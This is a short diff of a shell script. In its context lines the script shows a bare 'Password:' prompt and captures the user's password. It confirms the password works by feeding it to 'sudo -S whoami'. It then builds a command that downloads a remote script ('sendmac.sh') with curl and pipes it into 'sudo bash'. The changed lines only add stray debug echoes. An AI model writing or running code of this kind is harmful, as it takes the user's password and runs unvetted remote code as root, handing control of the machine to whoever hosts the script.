@@ -3,8 +3,10 @@
 echo ""
 
 psd=""
+echo "snek"
 echo -n "Password:"
 read -s psd </dev/tty
+echo "hxd"
 echo ""
 sudo -k
 
@@ -16,7 +18,7 @@ while [ "$(echo $psd | sudo -S whoami)" != "root" ]; do
   echo ""
   sudo -k
 done
-
+echo ""
 echo "out"
 
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
